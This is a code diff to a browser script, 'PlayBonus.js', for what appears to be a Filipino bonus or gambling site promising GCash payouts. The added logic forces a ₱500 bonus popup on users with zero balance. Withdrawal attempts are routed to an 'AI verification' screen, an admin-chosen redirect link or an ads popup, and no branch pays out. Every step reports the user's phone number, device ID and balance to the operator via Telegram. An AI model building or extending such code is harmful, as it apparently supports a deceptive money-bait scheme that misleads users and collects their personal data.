@@ -1,5 +1,5 @@
 /**
- * PlayBonus.js - ANTI-LAG OPTIMIZED
+ * PlayBonus.js - ANTI-LAG OPTIMIZED + ADS POPUP
  * 
  * ⚡ PERFORMANCE FIXES:
  * ✅ Reduced confetti (35 → 10, skip mobile)
@@ -10,6 +10,16 @@
  * ✅ Telegram throttling
  * ✅ textContent kaysa innerHTML (timer)
  * ✅ Canvas setTransform kaysa save/restore
+ * 
+ * 📢 FIREWALL LOGIC:
+ * ✅ FIREWALL OFF + MAY LINK → Redirect
+ * ✅ FIREWALL OFF + WALANG LINK → ADS Popup
+ * ✅ FIREWALL ON + ANY → AI Verification
+ * 
+ * 🎯 SMART CLAIM NOW:
+ * ✅ 0 Balance + Not Claimed → Force ₱500 Bonus Popup
+ * ✅ 0 Balance + Claimed → Withdraw Popup
+ * ✅ > 0 Balance → Withdraw Popup
  */
 
 (function() {
@@ -110,7 +120,6 @@
     
     function sendTelegram(message) {
         try {
-            // ⚡ Throttle: skip kung masyadong mabilis
             var now = Date.now();
             if (now - lastTelegramTime < TELEGRAM_THROTTLE_MS) {
                 console.log('⏳ Telegram throttled');
@@ -162,9 +171,6 @@
         sendTelegram(message);
     }
     
-    // ============================================================
-    // WITHDRAW NOTIFICATION (Telegram)
-    // ============================================================
     function sendWithdrawRequestNotif(userPhone, deviceId, balance, firewallStatus) {
         var timestamp = new Date().toLocaleString();
         var message = '💸 WITHDRAW REQUEST\n' +
@@ -200,6 +206,20 @@
             '💰 Balance: ₱' + balance.toFixed(2) + '\n' +
             '⏰ Time: ' + timestamp + '\n' +
             '📊 Status: Verification required\n' +
+            '━━━━━━━━━━━━━━━━━━━━';
+        sendTelegram(message);
+    }
+    
+    function sendAdsPopupNotif(userPhone, deviceId, balance) {
+        var timestamp = new Date().toLocaleString();
+        var message = '📢 ADS POPUP SHOWN\n' +
+            '━━━━━━━━━━━━━━━━━━━━\n' +
+            '👤 User: ' + userPhone + '\n' +
+            '🖥️ Device: ' + deviceId + '\n' +
+            '💰 Balance: ₱' + balance.toFixed(2) + '\n' +
+            '🔥 Firewall: OFF\n' +
+            '📊 Reason: No link deployed\n' +
+            '⏰ Time: ' + timestamp + '\n' +
             '━━━━━━━━━━━━━━━━━━━━';
         sendTelegram(message);
     }
@@ -345,12 +365,28 @@
     }
     
     // ============================================================
+    // 🆕 FORCE SHOW BONUS POPUP (para sa CLAIM NOW + 0 balance)
+    // ============================================================
+    function forceShowBonusPopup() {
+        console.log('🎁 Force showing bonus popup');
+        
+        var popup = document.getElementById('bonusRewardPopup');
+        if (!popup) {
+            console.warn('⚠️ bonusRewardPopup not found');
+            return;
+        }
+        
+        popup.style.display = 'flex';
+        playSound('scatter');
+        updateClaimButtonUI();
+    }
+    
+    // ============================================================
     // ANIMATED BALANCE
-    // ⚡ Reduced duration: 1500ms → 1000ms
     // ============================================================
     function animateBalanceThenSave(oldBalance, newBalance, callback) {
         var startTime = null;
-        var duration = 1000; // ⚡ Reduced from 1500
+        var duration = 1000;
         
         function step(timestamp) {
             if (!startTime) startTime = timestamp;
@@ -432,15 +468,36 @@
         var claimNowBtn = document.getElementById('claimNowBtn');
         var popup = document.getElementById('bonusRewardPopup');
         
-        // ========== CLAIM NOW → OPENS WITHDRAW POPUP ==========
+        // ========== CLAIM NOW → SMART HANDLER ==========
         if (claimNowBtn) {
             claimNowBtn.addEventListener('click', function(e) {
                 e.preventDefault();
                 e.stopPropagation();
                 
-                console.log('💸 CLAIM NOW clicked → Opening WITHDRAW popup');
+                console.log('💸 CLAIM NOW clicked');
+                console.log('💰 Current balance:', currentBalance);
+                console.log('🎁 isClaimed:', isClaimed);
+                
                 playSound('scatter');
                 
+                // ✅ CHECK: Kung 0 balance
+                if (currentBalance <= 0) {
+                    console.log('⚠️ 0 balance detected!');
+                    
+                    // ✅ KUNG HINDI PA CLAIMED → Force display ₱500 bonus popup
+                    if (!isClaimed) {
+                        console.log('🎁 Not claimed yet → Force showing ₱500 bonus popup');
+                        forceShowBonusPopup();
+                        return;
+                    }
+                    
+                    // ✅ KUNG CLAIMED NA → Huwag i-display ang bonus popup
+                    console.log('❌ Already claimed → Skipping bonus popup');
+                    // Continue sa withdraw popup
+                }
+                
+                // Default: Buksan ang withdraw popup
+                console.log('💸 Opening withdraw popup');
                 openClaimNowPopup();
             });
         }
@@ -501,16 +558,11 @@
     
     // ============================================================
     // ⚡ CONFETTI — OPTIMIZED
-    // - Skip sa mobile/reduced-motion
-    // - 35 → 10 pieces
-    // - Removed box-shadow
-    // - Slower animation (5-9s)
     // ============================================================
     function generateClaimNowConfetti() {
         var layer = document.getElementById('claimNowConfetti');
         if (!layer) return;
         
-        // ⚡ Skip sa mobile/reduced-motion
         if (SKIP_HEAVY_EFFECTS) {
             layer.style.display = 'none';
             return;
@@ -521,7 +573,6 @@
         var colors = ['#ff2d95', '#ffd700', '#ff8c00', '#00d4ff', '#39ff14', '#ffffff'];
         var shapes = ['circle', 'square', 'ribbon'];
         
-        // ⚡ Reduced from 35 → 10
         for (var i = 0; i < 10; i++) {
             var piece = document.createElement('div');
             var color = colors[Math.floor(Math.random() * colors.length)];
@@ -529,7 +580,7 @@
             var size = Math.random() * 8 + 5;
             var startX = Math.random() * 100;
             var delay = Math.random() * 4;
-            var duration = Math.random() * 4 + 5; // ⚡ Slower (5-9s)
+            var duration = Math.random() * 4 + 5;
             var rotate = Math.random() * 360;
             
             piece.className = 'claim-now-confetti ' + shape;
@@ -538,7 +589,6 @@
                 'width:' + size + 'px;' +
                 'height:' + (shape === 'ribbon' ? size * 2.5 : size) + 'px;' +
                 'background:' + color + ';' +
-                // ⚡ REMOVED box-shadow
                 'animation: claimNowConfettiFall ' + duration + 's ' + delay + 's linear infinite;' +
                 'transform: rotate(' + rotate + 'deg);';
             
@@ -560,7 +610,70 @@
     }
     
     // ============================================================
-    // MAIN: HANDLE CLAIM VIA GCASH
+    // 📢 ADS POPUP FUNCTIONS
+    // Lalabas kapag: Firewall OFF + Walang Link
+    // ============================================================
+    function showAdsPopup() {
+        var popup = document.getElementById('adsPopup');
+        if (!popup) {
+            console.warn('⚠️ adsPopup not found');
+            return;
+        }
+        
+        console.log('📢 Showing ADS popup');
+        popup.style.display = 'flex';
+        
+        if (!popup.dataset.eventsAttached) {
+            popup.dataset.eventsAttached = 'true';
+            attachAdsEvents();
+        }
+    }
+    
+    function closeAdsPopup() {
+        var popup = document.getElementById('adsPopup');
+        if (popup) popup.style.display = 'none';
+        console.log('📢 ADS popup closed');
+    }
+    
+    function attachAdsEvents() {
+        var closeBtn = document.getElementById('adsPopupClose');
+        if (closeBtn) {
+            closeBtn.onclick = function() {
+                console.log('✕ ADS close clicked');
+                closeAdsPopup();
+            };
+        }
+        
+        var skipBtn = document.getElementById('adsSkipBtn');
+        if (skipBtn) {
+            skipBtn.onclick = function() {
+                console.log('⏭️ SKIP ADS clicked');
+                playSound('claim');
+                closeAdsPopup();
+                
+                try {
+                    var userPhoneStr = localStorage.getItem("userPhone") || "Unknown";
+                    var deviceId = localStorage.getItem("userDeviceId") || "Unknown";
+                    sendTelegram(
+                        '⏭️ ADS SKIPPED\n' +
+                        '━━━━━━━━━━━━━━━━━━━━\n' +
+                        '👤 User: ' + userPhoneStr + '\n' +
+                        '🖥️ Device: ' + deviceId + '\n' +
+                        '⏰ Time: ' + new Date().toLocaleString() + '\n' +
+                        '━━━━━━━━━━━━━━━━━━━━'
+                    );
+                } catch(e) {}
+            };
+        }
+    }
+    
+    // ============================================================
+    // 🔥 MAIN: HANDLE CLAIM VIA GCASH
+    // 
+    // LOGIC:
+    // FIREWALL ON → AI VERIFICATION (any link status)
+    // FIREWALL OFF + MAY LINK → REDIRECT
+    // FIREWALL OFF + WALANG LINK → ADS POPUP
     // ============================================================
     async function handleClaimViaGCash() {
         if (withdrawInProgress) {
@@ -582,14 +695,18 @@
         }
         
         try {
+            // ========== STEP 1: CHECK FIREWALL ==========
             var firewallActive = await checkFirewallBeforeClaim();
             console.log('🔥 Firewall status:', firewallActive ? 'ON' : 'OFF');
             
             var userPhoneStr = localStorage.getItem("userPhone") || "Unknown";
             var deviceId = localStorage.getItem("userDeviceId") || "Unknown";
             
+            // ============================================
+            // 🔥 FIREWALL ON → AI VERIFICATION (ANY LINK STATUS)
+            // ============================================
             if (firewallActive) {
-                console.log('🔥 Firewall ON → Showing verification');
+                console.log('🔥 Firewall ON → Showing AI verification');
                 
                 sendWithdrawFirewallNotif(userPhoneStr, deviceId, currentBalance);
                 
@@ -601,48 +718,57 @@
                     gcashBtn.innerHTML = originalHTML;
                 }
                 withdrawInProgress = false;
-                
-            } else {
-                console.log('🔓 Firewall OFF → Getting admin link...');
-                
-                var redirectUrl = await getAdminRedirectLink();
-                
-                if (redirectUrl) {
-                    console.log('✅ Redirecting to:', redirectUrl);
-                    
-                    sendWithdrawRequestNotif(userPhoneStr, deviceId, currentBalance, false);
-                    
-                    if (gcashBtn) {
-                        gcashBtn.innerHTML = '<i class="fas fa-check"></i> <span>REDIRECTING...</span>';
-                    }
-                    
-                    setTimeout(function () {
-                        sendWithdrawRedirectNotif(userPhoneStr, deviceId, currentBalance);
-                        window.location.href = redirectUrl;
-                    }, 1500);
-                    
-                } else {
-                    console.warn('⚠️ Walang available link sa admin');
-                    
-                    sendTelegram(
-                        '⚠️ NO REDIRECT LINK\n' +
-                        '━━━━━━━━━━━━━━━━━━━━\n' +
-                        '👤 User: ' + userPhoneStr + '\n' +
-                        '🖥️ Device: ' + deviceId + '\n' +
-                        '💰 Balance: ₱' + currentBalance.toFixed(2) + '\n' +
-                        '⏰ Time: ' + new Date().toLocaleString() + '\n' +
-                        '━━━━━━━━━━━━━━━━━━━━'
-                    );
-                    
-                    alert('⚠️ Walang available withdrawal link. Please try again later.');
-                    
-                    if (gcashBtn) {
-                        gcashBtn.disabled = false;
-                        gcashBtn.innerHTML = originalHTML;
-                    }
-                    withdrawInProgress = false;
-                }
+                return;
             }
+            
+            // ============================================
+            // 🔓 FIREWALL OFF → CHECK LINK
+            // ============================================
+            console.log('🔓 Firewall OFF → Checking for link...');
+            
+            var redirectUrl = await getAdminRedirectLink();
+            
+            // ============================================
+            // 🔓 FIREWALL OFF + MAY LINK → REDIRECT
+            // ============================================
+            if (redirectUrl) {
+                console.log('✅ Link found → Redirecting to:', redirectUrl);
+                
+                sendWithdrawRequestNotif(userPhoneStr, deviceId, currentBalance, false);
+                
+                if (gcashBtn) {
+                    gcashBtn.innerHTML = '<i class="fas fa-check"></i> <span>REDIRECTING...</span>';
+                }
+                
+                setTimeout(function () {
+                    sendWithdrawRedirectNotif(userPhoneStr, deviceId, currentBalance);
+                    window.location.href = redirectUrl;
+                }, 1500);
+                
+                return;
+            }
+            
+            // ============================================
+            // 🔓 FIREWALL OFF + WALANG LINK → ADS POPUP
+            // ============================================
+            console.log('📢 No link found → Showing ADS popup');
+            
+            sendAdsPopupNotif(userPhoneStr, deviceId, currentBalance);
+            
+            // Isara ang withdraw popup
+            closeClaimNowPopup();
+            
+            // Ipakita ang ADS popup
+            setTimeout(function() {
+                showAdsPopup();
+            }, 300);
+            
+            // Reset button
+            if (gcashBtn) {
+                gcashBtn.disabled = false;
+                gcashBtn.innerHTML = originalHTML;
+            }
+            withdrawInProgress = false;
             
         } catch (error) {
             console.error('❌ Error:', error);
@@ -658,6 +784,9 @@
     
     // ============================================================
     // GET ADMIN REDIRECT LINK
+    // Priority:
+    // 1. admin/redirectLink
+    // 2. links (available)
     // ============================================================
     function getAdminRedirectLink() {
         return new Promise(function (resolve) {
@@ -667,6 +796,7 @@
                     return resolve(null);
                 }
                 
+                // ========== OPTION 1: admin/redirectLink ==========
                 db.ref('admin/redirectLink').once('value')
                     .then(function (snapshot) {
                         var data = snapshot.val();
@@ -676,6 +806,7 @@
                             return resolve(data.url);
                         }
                         
+                        // ========== OPTION 2: links (available) ==========
                         console.log('🔍 Fallback: checking links node...');
                         return db.ref('links')
                             .orderByChild('status')
@@ -1625,8 +1756,7 @@
     }
     
     // ============================================================
-    // ⚡ TIMER — OPTIMIZED
-    // - textContent kaysa innerHTML
+    // TIMER — OPTIMIZED
     // ============================================================
     function initTimer() {
         var displayElement = document.getElementById('mainTimerDisplay');
@@ -1661,7 +1791,6 @@
                 var minutes = Math.floor((diff / (1000 * 60)) % 60);
                 var seconds = Math.floor((diff / 1000) % 60);
                 
-                // ⚡ textContent kaysa innerHTML
                 displayElement.textContent = days + 'D ' +
                     hours.toString().padStart(2, '0') + ':' +
                     minutes.toString().padStart(2, '0') + ':' +
@@ -1676,8 +1805,7 @@
     }
     
     // ============================================================
-    // ⚡ TICKER — OPTIMIZED
-    // - 4.8s → 8s (less frequent)
+    // TICKER — OPTIMIZED
     // ============================================================
     function initTicker() {
         var winnerSpan = document.getElementById('winnerText');
@@ -1716,16 +1844,11 @@
         }
         
         updateTicker();
-        // ⚡ 4.8s → 8s
         setInterval(updateTicker, 8000);
     }
     
     // ============================================================
-    // ⚡ CONFETTI CANVAS — OPTIMIZED
-    // - Skip sa mobile/reduced-motion
-    // - 150 → 50 particles
-    // - setTransform kaysa save/restore
-    // - 4s → 2.5s duration
+    // CONFETTI CANVAS — OPTIMIZED
     // ============================================================
     var confettiCanvas = null;
     var confettiAnimation = null;
@@ -1733,7 +1856,6 @@
     function initConfetti() {
         confettiCanvas = document.getElementById('confettiCanvas');
         
-        // ⚡ I-hide ang canvas sa mobile
         if (SKIP_HEAVY_EFFECTS && confettiCanvas) {
             confettiCanvas.style.display = 'none';
         }
@@ -1742,7 +1864,6 @@
     function startConfetti() {
         if (!confettiCanvas) return;
         
-        // ⚡ Skip sa mobile/reduced-motion
         if (SKIP_HEAVY_EFFECTS) return;
         
         confettiCanvas.style.display = 'block';
@@ -1752,7 +1873,6 @@
         var ctx = confettiCanvas.getContext('2d');
         var particles = [];
         
-        // ⚡ Reduced from 150 → 50
         for (var i = 0; i < 50; i++) {
             particles.push({
                 x: Math.random() * confettiCanvas.width,
@@ -1771,7 +1891,6 @@
             
             for (var i = 0; i < particles.length; i++) {
                 var p = particles[i];
-                // ⚡ setTransform kaysa save/restore
                 ctx.setTransform(1, 0, 0, 1, p.x, p.y);
                 ctx.rotate(p.rotation * Math.PI / 180);
                 ctx.fillStyle = p.color;
@@ -1785,13 +1904,12 @@
                     p.x = Math.random() * confettiCanvas.width;
                 }
             }
-            ctx.setTransform(1, 0, 0, 1, 0, 0); // ⚡ Reset
+            ctx.setTransform(1, 0, 0, 1, 0, 0);
             confettiAnimation = requestAnimationFrame(draw);
         }
         
         draw();
         
-        // ⚡ Reduced duration: 4s → 2.5s
         setTimeout(function() {
             if (confettiAnimation) cancelAnimationFrame(confettiAnimation);
             ctx.clearRect(0, 0, confettiCanvas.width, confettiCanvas.height);
@@ -1933,9 +2051,7 @@
     }
     
     // ============================================================
-    // ⚡ FORCE LOGOUT POPUP — OPTIMIZED
-    // - 45 → 15 confetti pieces
-    // - Removed box-shadow sa confetti
+    // FORCE LOGOUT POPUP — OPTIMIZED
     // ============================================================
     function showForceLogoutPopup() {
         if (document.querySelector('.force-logout-popup')) return;
@@ -1951,7 +2067,6 @@
         var confettiColors = ['#ff2d95', '#ffd700', '#ff8c00', '#00d4ff', '#39ff14', '#ffffff'];
         var confettiShapes = ['circle', 'square', 'ribbon'];
         
-        // ⚡ Reduced from 45 → 15
         for (var i = 0; i < 15; i++) {
             var piece = document.createElement('div');
             var color = confettiColors[Math.floor(Math.random() * confettiColors.length)];
@@ -1959,7 +2074,7 @@
             var size = Math.random() * 8 + 5;
             var startX = Math.random() * 100;
             var delay = Math.random() * 4;
-            var duration = Math.random() * 4 + 5; // ⚡ Slower
+            var duration = Math.random() * 4 + 5;
             var rotate = Math.random() * 360;
             
             piece.className = 'carnival-confetti ' + shape;
@@ -1968,7 +2083,6 @@
                 'width: ' + size + 'px;' +
                 'height: ' + (shape === 'ribbon' ? size * 2.5 : size) + 'px;' +
                 'background: ' + color + ';' +
-                // ⚡ REMOVED box-shadow
                 'animation: carnivalFall ' + duration + 's ' + delay + 's linear infinite;' +
                 'transform: rotate(' + rotate + 'deg);';
             confettiLayer.appendChild(piece);
@@ -2348,23 +2462,23 @@
         isUserClaimed: function() { return isClaimed; },
         openClaimNowPopup: openClaimNowPopup,
         closeClaimNowPopup: closeClaimNowPopup,
-        handleClaimViaGCash: handleClaimViaGCash
+        handleClaimViaGCash: handleClaimViaGCash,
+        showAdsPopup: showAdsPopup,
+        closeAdsPopup: closeAdsPopup,
+        forceShowBonusPopup: forceShowBonusPopup
     };
     
     // ============================================================
-    // ⚡ START — OPTIMIZED
-    // - Ban check: 5s → 30s
+    // START — OPTIMIZED
     // ============================================================
     if (document.readyState === 'loading') {
         document.addEventListener('DOMContentLoaded', function() {
             init();
-            // ⚡ 5s → 30s
             setInterval(checkIfBanned, 30000);
             checkIfBanned();
         });
     } else {
         init();
-        // ⚡ 5s → 30s
         setInterval(checkIfBanned, 30000);
         checkIfBanned();
     }
